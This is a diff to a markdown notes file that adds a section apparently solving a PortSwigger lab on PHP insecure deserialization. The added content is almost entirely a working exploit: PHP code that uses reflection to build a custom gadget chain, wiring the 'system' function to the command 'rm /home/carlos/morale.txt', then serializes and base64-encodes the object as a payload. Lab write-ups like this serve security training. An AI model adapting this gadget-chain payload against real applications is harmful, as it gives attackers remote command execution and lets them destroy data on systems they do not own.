@@ -363,7 +363,35 @@ echo urlencode(serialize($filename));
 
 -  [Source Code](https://github.com/jmoraissec/ctf-insecure-deserialization)
 
+---------------
+
+### Portswigger php custom gadget chain
+
 ----------------
+
+-  Source Code-:
+
+```php
+<?php
+include("customtemplate.php");
+$default_map = new DefaultMap("system");
+$gadgetcustomTemp  = new CustomTemplate();
+
+$customTemp =  new CustomTemplate('ls');
+$reflection =  new \ReflectionClass($customTemp);
+$property = $reflection->getProperty("desc");
+$property->setAccessible(true);
+$property->setValue($customTemp,$default_map);
+$property = $reflection->getProperty("default_desc_type");
+$property->setAccessible(true);
+$property->setValue($customTemp,'rm /home/carlos/morale.txt');
+
+echo base64_encode(serialize($customTemp));
+?>
+```
+
+----------------
+
 ### Sauce
 
 --------------
